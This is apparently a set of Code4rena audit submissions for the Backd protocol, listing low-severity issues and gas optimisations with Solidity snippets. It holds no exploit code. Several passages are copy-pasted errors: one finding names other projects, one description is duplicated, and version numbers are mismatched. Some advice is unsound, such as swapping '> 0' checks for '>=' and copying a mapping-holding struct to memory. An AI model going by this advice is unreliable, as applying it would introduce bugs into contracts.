Proof of Concept  There are a few validations that could be added to the system:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/LpGauge.sol#L33  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L55  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L51  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Consider adding zero-address and zero value checks.  # C4-004 : The Contract Should approve(0) first  ## Impact  - LOW  Some tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.  ``` IERC20(token).safeApprove(address(operator), 0); IERC20(token).safeApprove(address(operator), amount); ```  ## Proof of Concept  1. Navigate to the following contracts.  ```   protocol/contracts/tokenomics/AmmConvexGauge.sol::61 => IERC20(ammToken).safeApprove(booster, type(uint256).max);   protocol/contracts/tokenomics/FeeBurner.sol::118 => IERC20(token_).safeApprove(spender_, type(uint256).max);  ```  2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.  ## Tools Used  None  ## Recommended Mitigation Steps  Approve with a zero amount first before setting the actual amount. Consider use safeIncreaseAllowance and safeDecreaseAllowance.   # C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens  ## Impact -  LOW  PrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.  ## Proof of Concept  1. Navigate to the following contract.  ``` protocol/contracts/tokenomics/VestedEscrowRevocable.sol:10:- remove safeTransferFrom logic and add support for "airdropped" reward token protocol/contracts/tokenomics/VestedEscrowRevocable.sol:60:        rewardToken.safeTransferFrom( protocol/contracts/tokenomics/AmmConvexGauge.sol:162:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); protocol/contracts/tokenomics/FeeBurner.sol:70:            token_.safeTransferFrom(msg.sender, address(this), tokenBalance_); protocol/contracts/tokenomics/VestedEscrow.sol:10:- remove safeTransferFrom logic and add support for "airdropped" reward token protocol/contracts/tokenomics/VestedEscrow.sol:146:        rewardToken.safeTransferFrom(holdingContract[msg.sender], _recipient, claimable); protocol/contracts/tokenomics/AmmGauge.sol:109:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ```  ## Tools Used  Manual Code Review  ## Recommended Mitigation Steps  - Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation - Add support in contracts for such tokens before accepting user-supplied tokens - Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.   # C4-006 : Contract should have pause/unpause functionality  ## Impact  In case a hack is occuring or an exploit is discovered, the team should be able to pause functionality until the necessary changes are made to the system. Additionally, the AuraLocker.sol contract should be manged by proxy so that upgrades can be made by the owner.  To use a thorchain example again, the team behind thorchain noticed an attack was going to occur well before the system transferred funds to the hacker. However, they were not able to shut the system down fast enough. (According to the incidence report here: https://github.com/HalbornSecurity/PublicReports/blob/master/Incident%20Reports/Thorchain_Incident_Analysis_July_23_2021.pdf)   ## Proof of Concept  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L249   ## Tools Used  Code Review  ## Recommended Mitigation Steps  Pause functionality on the contract would have helped secure the funds quickly.   # C4-007 : Front-runnable Initializers  ## Impact - LOW  All contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.   ## Proof of Concept  1. Navigate to the following contracts.  ``` protocol/contracts/BkdLocker.sol:53:    function initialize( protocol/contracts/LpToken.sol:28:    function initialize( protocol/contracts/StakerVault.sol:71:    function initialize(address _token) external override initializer {  ```  2. initialize functions does not have access control. They are vulnerable to front-running.  ## Tools Used  Manual Code Review  ## Recommended Mitigation Steps  While the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control. 
### [G-01] Unnecessary check for positive value  #### Description  A `uint256` value can not be negative, hence there is no need to check for it.  #### Findings  [tokenomics/InflationManager.sol#L589](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L589)  ```solidity totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0; ```  [tokenomics/InflationManager.sol#L602](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L602)  ```solidity totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ```  [tokenomics/InflationManager.sol#L575](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L575)  ```solidity totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0; ```  #### Recommended mitigation steps  Remove the check and use the value directly to save gas.  ### [G-02] Unnecessary `poolCheckpoint` function call  The `AmmGauge` and `KeeperGauge` contracts call the function `poolCheckpoint()` within the `kill()` function. Therefore, functions which call this `kill()` function do not have to additionally call the `poolCheckpoint()` function.  #### Description  A `uint256` value can not be negative, hence there is no need to check for it.  #### Findings  [tokenomics/InflationManager.sol#L427](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L427)\ [tokenomics/InflationManager.sol#L461](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L461)  #### Recommended mitigation steps  Remove the call to `poolCheckpoint()` to save gas. 
#1 Immutable  Impact the state can't be initialize  by constructor.  Proof Of Concept  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L35  Tool Used Manual Review  Recommended Mitigation Steps the state must add immutable because in the constructor parameter mention fundAdmin to initialize. so i suggest to add immutable on it.      address public fundAdmin; to      address public immutable fundAdmin;  #2 Typo  Impact missleading  Proof of Concept https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173  Tools Used manual review  Recommended Mitigation Steps fix the typo to increase readibility. fix it from        * @dev This does not invlude the gov. tokens queued for withdrawal. to       * @dev This does not includes the gov. tokens queued for withdrawal. 
## C4-001: Revert String Size Optimization ## C4-002 : Adding unchecked directive can save gas ## C4-003 : Check if amount > 0 before token transfer can save gas ## C4-004 : There is no need to assign default values to variables ## C4-005 : Free gas savings for using solidity 0.8.10+ ## C4-006 : Using operator && used more gas ## C4-007 : Non-strict inequalities are cheaper than strict ones ## C4-008 : Use Custom Errors instead of Revert Strings to save Gas ## C4-009 : Use Shift Right/Left instead of Division/Multiplication if possible ## C4-010 : Cache array length in for loops can save gas ## C4-011 : State Variables that can be changed to immutable ## C4-012 : Use calldata instead of memory for function parameters   # C4-001: Revert String Size Optimization  ## Impact  Shortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.   ## Proof of Concept  Revert strings > 32 bytes are here:  ```   ../2022-05-backd-main/protocol/libraries/Errors.sol::11 => string internal constant CONTRACT_INITIALIZED = "contract can only be initialized once";   ../2022-05-backd-main/protocol/libraries/Errors.sol::18 => string internal constant INVALID_TOKEN = "token address does not match pool's LP token address";   ../2022-05-backd-main/protocol/libraries/Errors.sol::21 => string internal constant INVALID_PARAMETER_VALUE = "invalid parameter value attempted";   ../2022-05-backd-main/protocol/libraries/Errors.sol::22 => string internal constant INVALID_IMPLEMENTATION = "invalid pool implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::24 => "invalid pool implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::26 => "invalid LP Token implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::28 => "invalid vault implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::30 => "invalid stakerVault implementation for given coin";   ../2022-05-backd-main/protocol/libraries/Errors.sol::33 => string internal constant INSUFFICIENT_AMOUNT_OUT = "Amount received less than min amount";   ../2022-05-backd-main/protocol/libraries/Errors.sol::34 => string internal constant INSUFFICIENT_AMOUNT_IN = "Amount spent more than max amount";   ../2022-05-backd-main/protocol/libraries/Errors.sol::47 => string internal constant THRESHOLD_TOO_HIGH = "threshold is too high, must be under 10";   ../2022-05-backd-main/protocol/libraries/Errors.sol::51 => string internal constant CANNOT_EXECUTE_IN_SAME_BLOCK = "cannot execute action in same block";   ../2022-05-backd-main/protocol/libraries/Errors.sol::57 => "not enough funds were withdrawn from the pool";   ../2022-05-backd-main/protocol/libraries/Errors.sol::63 => string internal constant ERC20_BALANCE_EXCEEDED = "ERC20: transfer amount exceeds balance";   ../2022-05-backd-main/protocol/libraries/Errors.sol::65 => "the minter address of the LP token and the pool address do not match";   ../2022-05-backd-main/protocol/libraries/Errors.sol::66 => string internal constant STAKER_VAULT_EXISTS = "a staker vault already exists for the token";   ../2022-05-backd-main/protocol/libraries/Errors.sol::70 => string internal constant DEADLINE_NOT_REACHED = "deadline has not been reached yet";   ../2022-05-backd-main/protocol/libraries/Errors.sol::73 => "insufficient funds for updating the position";   ../2022-05-backd-main/protocol/libraries/Errors.sol::74 => string internal constant SAME_AS_CURRENT = "value must be different to existing value";   ../2022-05-backd-main/protocol/libraries/Errors.sol::80 => string internal constant ESTIMATED_GAS_TOO_HIGH = "too much ETH will be used for gas";   ../2022-05-backd-main/protocol/libraries/Errors.sol::84 => string internal constant GAS_BANK_BALANCE_TOO_LOW = "not enough ETH in gas bank to cover gas";   ../2022-05-backd-main/protocol/libraries/Errors.sol::89 => "pool does not support additional underlying coins to be withdrawn";   ../2022-05-backd-main/protocol/libraries/Errors.sol::95 => string internal constant TOKEN_NOT_USABLE = "token not usable for the specific action";   ../2022-05-backd-main/protocol/libraries/Errors.sol::99 => string internal constant POOL_NOT_PAUSED = "Pool must be paused to withdraw from reserve";   ../2022-05-backd-main/protocol/libraries/Errors.sol::100 => string internal constant INTERACTION_LIMIT = "Max of one deposit and withdraw per block";   ../2022-05-backd-main/protocol/libraries/Errors.sol::103 => string internal constant EXCEEDS_MAX_BOOST = "Not allowed to exceed maximum boost on Convex";   ../2022-05-backd-main/protocol/libraries/Errors.sol::105 => "Cannot relock funds when withdrawal is being prepared"; ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Shorten the revert strings to fit in 32 bytes. That will affect gas optimization.  # C4-002 : Adding unchecked directive can save gas  ## Impact  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  ## Proof of Concept  ```   ../2022-05-backd-main/protocol/contracts/zaps/PoolMigrationZap.sol::22 => for (uint256 i; i < newPools_.length; ++i) {  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider applying unchecked arithmetic where overflow/underflow is not possible. Example can be seen from below.  ``` Unchecked{i++}; ```  # C4-003 : Check if amount > 0 before token transfer can save gas  ## Impact  Since _amount can be 0. Checking if (_amount != 0) before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.  ## Proof of Concept  ``` ./protocol/contracts/tokenomics/VestedEscrowRevocable.sol:10:- remove safeTransferFrom logic and add support for "airdropped" reward token ./protocol/contracts/tokenomics/VestedEscrowRevocable.sol:60:        rewardToken.safeTransferFrom( ./protocol/contracts/tokenomics/AmmConvexGauge.sol:162:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ./protocol/contracts/tokenomics/FeeBurner.sol:70:            token_.safeTransferFrom(msg.sender, address(this), tokenBalance_); ./protocol/contracts/tokenomics/VestedEscrow.sol:10:- remove safeTransferFrom logic and add support for "airdropped" reward token ./protocol/contracts/tokenomics/VestedEscrow.sol:146:        rewardToken.safeTransferFrom(holdingContract[msg.sender], _recipient, claimable); ./protocol/contracts/tokenomics/AmmGauge.sol:109:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ```  All Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  Consider checking amount != 0.  # C4-004 : There is no need to assign default values to variables  ## Impact -  Gas Optimization  Boolean is default initialized to false. There is no need assign false to variable.   ## Proof of Concept  ```   protocol/contracts/tokenomics/InflationManager.sol::412 => bool keeperGaugeExists = false;   ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  bool x = false costs more gas than bool x without having any different functionality.   # C4-005 : Free gas savings for using solidity 0.8.13+  ## Impact  Using newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.  ## Proof of Concept  ``` All Contracts ```   Solidity 0.8.14 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/  Solidity 0.8.13 has some improvements too but not well tested.  Code Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist  All Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to upgrade pragma to at least 0.8.13.   # C4-006 : Using operator && used more gas  ## Impact  Using double require instead of operator && can save more gas.  ## Proof of Concept  1. Navigate to the following contracts.  ``` protocol/contracts/tokenomics/AmmConvexGauge.sol:73:        if (amount <= 0 && crvAmount <= 0 && cvxAmount <= 0) return 0; protocol/contracts/tokenomics/AmmConvexGauge.sol:107:        if (!killed && totalStaked > 0) { protocol/contracts/tokenomics/AmmConvexGauge.sol:129:        if (!killed && totalStaked > 0) { protocol/contracts/tokenomics/InflationManager.sol:420:        if (!keeperGaugeExists && weightBasedKeeperDistributionDeactivated && length >= 1) { protocol/contracts/tokenomics/InflationManager.sol:426:        if (exists && !IKeeperGauge(keeperGauge).killed()) { protocol/contracts/tokenomics/AmmGauge.sol:88:        if (!killed && totalStaked > 0) {   ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Example  ```  using &&:  function check(uint x)public view{ require(x == 0 && x < 1 ); } // gas cost 21630  using double require:  require(x == 0 ); require( x < 1); } } // gas cost 21622 ```   # C4-007 : Non-strict inequalities are cheaper than strict ones  ## Impact  Strict inequalities add a check of non equality which costs around 3 gas.  ## Proof of Concept  ```   protocol/contracts/BkdLocker.sol::91 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/BkdLocker.sol::92 => require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);   protocol/contracts/BkdLocker.sol::137 => require(length > 0, "No entries");   protocol/contracts/BkdLocker.sol::139 => while (i > 0) {   protocol/contracts/BkdLocker.sol::254 => if (userBalance > 0) {   protocol/contracts/BkdLocker.sol::301 => if (userBalance > 0) {   protocol/contracts/CvxCrvRewardsLocker.sol::174 => if (cvxcrvBal > 0) {   protocol/contracts/CvxCrvRewardsLocker.sol::268 => if (IERC20(CVX_CRV).balanceOf(address(this)) > 0)   protocol/contracts/LpToken.sol::87 => if (amount > 0) ILiquidityPool(minter).handleLpTokenTransfer(from, to, amount); // add check to not break 0 transfers   protocol/contracts/RewardHandler.sol::63 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpAction.sol::57 => if (depositAmount > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::67 => if (lockAmount > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::103 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpAction.sol::214 => require(record.singleTopUpAmount > 0, Error.INVALID_AMOUNT);   protocol/contracts/actions/topup/TopUpAction.sol::535 => require(position.totalTopUpAmount > 0, Error.INSUFFICIENT_BALANCE);   protocol/contracts/actions/topup/TopUpAction.sol::655 => if (position.depositTokenBalance > 0) {   protocol/contracts/actions/topup/TopUpAction.sol::866 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/TopUpActionFeeHandler.sol::123 => require(totalClaimable > 0, Error.NOTHING_TO_CLAIM);   protocol/contracts/actions/topup/handlers/AaveHandler.sol::62 => if (variableDebt + stableDebt > 0) {   protocol/contracts/actions/topup/handlers/AaveHandler.sol::84 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/actions/topup/handlers/CompoundHandler.sol::137 => if (IERC20(token).allowance(address(this), spender) > 0) return;   protocol/contracts/pool/LiquidityPool.sol::469 => require(underlyingAmount > 0, Error.INVALID_AMOUNT);   protocol/contracts/pool/LiquidityPool.sol::471 => require(lpToken_.balanceOf(account) > 0, Error.INSUFFICIENT_BALANCE);   protocol/contracts/pool/LiquidityPool.sol::514 => require(mintedLp >= minTokenAmount && mintedLp > 0, Error.INVALID_AMOUNT);   protocol/contracts/pool/LiquidityPool.sol::538 => require(redeemLpTokens > 0, Error.INVALID_AMOUNT);   protocol/contracts/strategies/BkdEthCvx.sol::105 => if (stakedBalance > 0) {   protocol/contracts/strategies/BkdEthCvx.sol::111 => if (lpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::154 => if (underlyingBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::162 => if (hopLpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::214 => if (hopLpBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::361 => if (stakedBalance > 0) {   protocol/contracts/strategies/BkdTriHopCvx.sol::367 => if (lpBalance > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::410 => if (cvxCommunityReserveShare_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::413 => if (cvxBalance_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::421 => if (crvCommunityReserveShare_ > 0) {   protocol/contracts/strategies/ConvexStrategyBase.sol::424 => if (crvBalance_ > 0) {   protocol/contracts/swappers/SwapperRouter.sol::264 => if (IERC20(token_).allowance(address(this), spender_) > 0) return;   protocol/contracts/testing/MockErc20Strategy.sol::64 => require(currentBalance > 0, "Invalid amount to withdraw");   protocol/contracts/testing/MockErc20Strategy.sol::74 => require(amount > 0, "Invalid amount to transfer");   protocol/contracts/testing/MockEthStrategy.sol::65 => require(currentBalance > 0, "Invalid amount to withdraw");   protocol/contracts/testing/MockVotingEscrow.sol::35 => require(_balances[msg.sender] > 0, "a lock needs to first be created");   protocol/contracts/tokenomics/AmmConvexGauge.sol::107 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmConvexGauge.sol::129 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmConvexGauge.sol::158 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmConvexGauge.sol::171 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmConvexGauge.sol::197 => if (totalStaked > 0) {   protocol/contracts/tokenomics/AmmGauge.sol::88 => if (!killed && totalStaked > 0) {   protocol/contracts/tokenomics/AmmGauge.sol::104 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmGauge.sol::125 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/tokenomics/AmmGauge.sol::147 => if (totalStaked > 0) {   protocol/contracts/tokenomics/FeeBurner.sol::117 => if (IERC20(token_).allowance(address(this), spender_) > 0) return;   protocol/contracts/tokenomics/InflationManager.sol::575 => totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;   protocol/contracts/tokenomics/InflationManager.sol::589 => totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;   protocol/contracts/tokenomics/InflationManager.sol::602 => totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0;   protocol/contracts/tokenomics/KeeperGauge.sol::140 => require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED);   protocol/contracts/tokenomics/LpGauge.sol::68 => if (poolTotalStaked > 0) {   protocol/contracts/tokenomics/LpGauge.sol::114 => if (poolTotalStaked > 0) {   protocol/contracts/tokenomics/VestedEscrow.sol::84 => require(unallocatedSupply > 0, "No reward tokens in contract");   protocol/contracts/vault/Vault.sol::163 => require(amount > 0, Error.INVALID_AMOUNT);   protocol/contracts/vault/Vault.sol::231 => if (remainingStrategyBalance > 0) {   protocol/contracts/vault/Vault.sol::466 => if (strategistShare > 0) {   protocol/contracts/vault/Vault.sol::609 => if (currentDebt > 0) {   protocol/contracts/vault/Vault.sol::638 => if (strategistShare > 0) {   protocol/contracts/vault/Vault.sol::711 => if (govShare > 0) {   protocol/contracts/vault/Vault.sol::727 => } else if (underlyingReserves > 0) { ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Use >= or <= instead of > and < when possible.   # C4-008 : Use Custom Errors instead of Revert Strings to save Gas   Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Instances include:  All require Statements  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Recommended to replace revert strings with custom errors.   # C4-009 : Use Shift Right/Left instead of Division/Multiplication if possible  ## Impact  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ## Proof of Concept  Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.    # C4-010 : Cache array length in for loops can save gas  ## Impact  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  ## Proof of Concept  1. Navigate to the following smart contract line.  ```   protocol/contracts/tokenomics/InflationManager.sol::116 => for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {   protocol/contracts/tokenomics/VestedEscrow.sol::94 => for (uint256 i; i < amounts.length; i = i.uncheckedInc()) {   protocol/contracts/zaps/PoolMigrationZap.sol::22 => for (uint256 i; i < newPools_.length; ++i) {   protocol/contracts/zaps/PoolMigrationZap.sol::39 => for (uint256 i; i < oldPoolAddresses_.length; ) {   protocol/libraries/EnumerableExtensions.sol::19 => uint256 len = addresses.length();  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to cache array length.   # C4-011 : State Variables that can be changed to immutable   ## Impact  Solidity 0.6.5 introduced immutable as a major feature. It allows setting contract-level variables at construction time which gets stored in code rather than storage.  Consider the following generic example:  ``` contract C {    /// The owner is set during contruction time, and never changed afterwards.    address public owner = msg.sender; } ```  In the above example, each call to the function owner() reads from storage, using a sload. After EIP-2929, this costs 2100 gas cold or 100 gas warm. However, the following snippet is more gas efficient:  ``` contract C {    /// The owner is set during contruction time, and never changed afterwards.    address public immutable owner = msg.sender; } ```  In the above example, each storage read of the owner state variable is replaced by the instruction push32 value, where value is set during contract construction time. Unlike the last example, this costs only 3 gas.  ## Proof of Concept  1. Navigate to the following smart contract line.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L39 ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider using immutable variable.    # C4-012 : Use calldata instead of memory for function parameters  ## Impact   In some cases, having function arguments in calldata instead of memory is more optimal.  Consider the following generic example:  ``` contract C {    function add(uint[] memory arr) external returns (uint sum) {        uint length = arr.length;        for (uint i = 0; i < arr.length; i++) {            sum += arr[i];        }    } } ```  In the above example, the dynamic array arr has the storage location memory. When the function gets called externally, the array values are kept in calldata and copied to memory during ABI decoding (using the opcode calldataload and mstore). And during the for loop, arr[i] accesses the value in memory using a mload. However, for the above example this is inefficient. Consider the following snippet instead:  ``` contract C {    function add(uint[] calldata arr) external returns (uint sum) {        uint length = arr.length;        for (uint i = 0; i < arr.length; i++) {            sum += arr[i];        }    } } ```  In the above snippet, instead of going via memory, the value is directly read from calldata using calldataload. That is, there are no intermediate memory operations that carries this value.  Gas savings: In the former example, the ABI decoding begins with copying value from calldata to memory in a for loop. Each iteration would cost at least 60 gas. In the latter example, this can be completely avoided. This will also reduce the number of instructions and therefore reduces the deploy time cost of the contract.  In short, use calldata instead of memory if the function argument is only read.  Note that in older Solidity versions, changing some function arguments from memory to calldata may cause "unimplemented feature error". This can be avoided by using a newer (0.8.*) Solidity compiler.   ## Proof of Concept  1. Navigate to the following smart contract line.  ``` protocol/contracts/tokenomics/FeeBurner.sol:43:    function burnToTarget(address[] memory tokens_, address targetLpToken_)  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Some parameters in examples given above are later hashed. It may be beneficial for those parameters to be in memory rather than calldata.
### Unchecked Gas Optimisation in Minter.sol A check is already made to make sure that `issuedNonInflationSupply` does not exceed a certain value so an arithmetic overflow is not possible  Change `issuedNonInflationSupply += amount;` to `unchecked { issuedNonInflationSupply += amount;} `  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150-L154  ### Unchecked Gas Optimisations in AmmGauge.sol We can make another unchecked addition because `totalStaked` will always be larger than `balances[user]`  Change ``` balances[account] += staked; totalStaked += staked; ```  to ``` totalStaked += staked; unchecked { balances[account] += staked; }  ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L112-L113  In Line 134 and 135 Change ``` balances[msg.sender] -= unstaked; totalStaked -= unstaked; ``` to  ``` balances[msg.sender] -= unstaked; unchecked { totalStaked -= unstaked } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L134-L135  ### KeeperGauge.sol Change `epoch++` to `++epoch` as talked about [here](https://www.reddit.com/r/ethdev/comments/tcwspw/i_vs_i_gas_efficiency/) https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98  Change ```         keeperRecords[beneficiary].feesInPeriod[epoch] += amount;         perPeriodTotalFees[epoch] += amount; ``` to ```         perPeriodTotalFees[epoch] += amount;         unchecked { keeperRecords[beneficiary].feesInPeriod[epoch] += amount; }          ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L87-L88  # BkdLocker.sol As we already make a value check we do not need to worry about arithmetic overflow Wrap `unchecked` around ```         totalStashed[msg.sender] += amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L119-L123  Again we have a similar issue  Change ```         totalStashed[msg.sender] -= totalAvailableToWithdraw;         uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;         _userCheckpoint(msg.sender, 0, newTotal);         totalLocked -= totalAvailableToWithdraw; ``` to ```         totalStashed[msg.sender] -= totalAvailableToWithdraw;         uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;         _userCheckpoint(msg.sender, 0, newTotal);         unchecked { totalLocked -= totalAvailableToWithdraw; } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L149-L152  `curRewardTokenData.feeBalance` will always be larger than or equal to `curRewardTokenData.userShares[msg.sender]` of any user so we can change Line 216 to `unchecked { curRewardTokenData.feeBalance -= claimable; }`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L214-L216  ### Gas Savings in `_userCheckpoint()` in `BkdLocker.sol` Contract Variables such as `boostFactors` and `curRewardTokenData` are read multiple times throughout the contract. This requires multiple SLOAD operations which are very expensive. It is better to load the variables into memory and use those when reading while the storage variables can be used for writing.  See [here](https://dev.to/javier123454321/solidity-gas-optimization-pt1-4271) for more info i.e. ```                RewardTokenData storage curRewardTokenData = rewardTokenData[rewardToken];           // Compute the share earned by the user since they last updated         uint256 userBalance = balances[user];         if (userBalance > 0) {             curRewardTokenData.userShares[user] += (curRewardTokenData.feeIntegral -                 curRewardTokenData.userFeeIntegrals[user]).scaledMul(                     userBalance.scaledMul(boostFactors[user])                 );  ``` can be changed to ```         RewardTokenData storage curRewardTokenData = rewardTokenData[rewardToken];         RewardTokenData memory _curRewardTokenData = curRewardTokenData           // Compute the share earned by the user since they last updated         uint256 userBalance = balances[user];         if (userBalance > 0) {             curRewardTokenData.userShares[user] += (_curRewardTokenData.feeIntegral -                 _curRewardTokenData.userFeeIntegrals[user]).scaledMul(                     userBalance.scaledMul(boostFactors[user])                 ); ```  This also applies to `boostFactors` and `prevRewardTokenData`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L292-L335  
